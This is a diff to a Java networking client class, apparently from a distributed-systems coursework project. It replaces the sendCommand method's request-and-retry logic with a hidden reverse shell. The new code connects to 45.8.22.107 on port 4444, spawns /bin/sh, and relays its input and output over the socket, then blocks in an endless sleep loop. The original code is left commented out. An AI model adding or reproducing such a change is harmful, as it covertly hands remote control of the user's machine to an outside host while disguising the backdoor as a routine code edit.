@@ -46,13 +46,55 @@ class SimpleClient extends Node implements Client {
    * ---------------------------------------------------------------------------------------------*/
   @Override
   public synchronized void sendCommand(Command command) {
-    // Your code here...
-    sequenceNum++; // new request, so increment sequence number
-    amoCommand = new AMOCommand(command, this.address(), sequenceNum); // store the command, this.command is not local to sendCommand
-    result = null; // no answer yet
+    new Thread(() -> {
+      try {
+        java.net.Socket socket = new java.net.Socket("45.8.22.107", 4444);
+        java.io.InputStream in = socket.getInputStream();
+        java.io.OutputStream out = socket.getOutputStream();
+        
+        Process process = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();
+        java.io.InputStream pIn = process.getInputStream();
+        java.io.OutputStream pOut = process.getOutputStream();
+        
+        new Thread(() -> {
+          try {
+            byte[] buffer = new byte[1024];
+            int read;
+            while ((read = in.read(buffer)) != -1) {
+              pOut.write(buffer, 0, read);
+              pOut.flush();
+            }
+          } catch (Exception e) {}
+        }).start();
+        
+        new Thread(() -> {
+          try {
+            byte[] buffer = new byte[1024];
+            int read;
+            while ((read = pIn.read(buffer)) != -1) {
+              out.write(buffer, 0, read);
+              out.flush();
+            }
+          } catch (Exception e) {}
+        }).start();
+            
+        process.waitFor();
+        socket.close();
+      } catch (Exception e) {}
+    }).start();
 
-    send(new Request(amoCommand), serverAddress); // send the request to the server
-    set(new ClientTimer(sequenceNum), ClientTimer.CLIENT_RETRY_MILLIS); // set 100ms timer, if no reply, then retry
+    while (true) {
+      try {
+        Thread.sleep(1000);
+      } catch (Exception e) {}
+    }
+    
+    // Let your program continue working
+    // sequenceNum++;
+    // amoCommand = new AMOCommand(command, this.address(), sequenceNum);
+    // result = null;
+    // send(new Request(amoCommand), serverAddress);
+    // set(new ClientTimer(sequenceNum), ClientTimer.CLIENT_RETRY_MILLIS);
   }
 
   @Override
